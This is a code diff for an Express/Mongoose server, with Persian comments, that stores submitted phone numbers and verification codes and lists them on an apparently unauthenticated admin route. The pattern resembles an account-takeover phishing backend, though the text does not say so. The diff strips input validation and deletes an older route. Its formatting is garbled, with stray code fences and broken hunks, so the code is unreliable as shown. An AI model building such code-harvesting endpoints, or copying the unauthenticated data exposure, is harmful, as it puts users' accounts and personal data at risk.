@@ -23,7 +23,6 @@ default: Date.now,
 
 const User = mongoose.model("User", UserSchema);
 
-// ثبت شماره
 app.post("/phone", async (req, res) => {
 try {
 const { phone } = req.body;
@@ -53,19 +52,11 @@ error: err.message,
 }
 });
 
-// ذخیره کد (مسیر جدید)
 app.post("/verify", async (req, res) => {
 try {
 const { id, code } = req.body;
 
 ```
-if (!id || !code) {
-  return res.status(400).json({
-    ok: false,
-    error: "id and code required",
-  });
-}
-
 const user = await User.findByIdAndUpdate(
   id,
   { code },
@@ -86,46 +77,18 @@ res.json({
 ```
 
 } catch (err) {
-res.status(500).json({
-ok: false,
-error: err.message,
-});
-}
-});
-
-// مسیر قدیمی هم باقی بماند
-app.put("/code/:id", async (req, res) => {
-try {
-const { id } = req.params;
-const { code } = req.body;
+console.log(err);
 
 ```
-const user = await User.findByIdAndUpdate(
-  id,
-  { code },
-  { new: true }
-);
-
-if (!user) {
-  return res.status(404).json({
-    error: "user not found",
-  });
-}
-
-res.json({
-  success: true,
-  user,
+res.status(500).json({
+  ok: false,
+  error: err.message,
 });
 ```
 
-} catch (err) {
-res.status(500).json({
-error: err.message,
-});
 }
 });
 
-// پنل ادمین
 app.get("/users", async (req, res) => {
 try {
 const users = await User.find().sort({
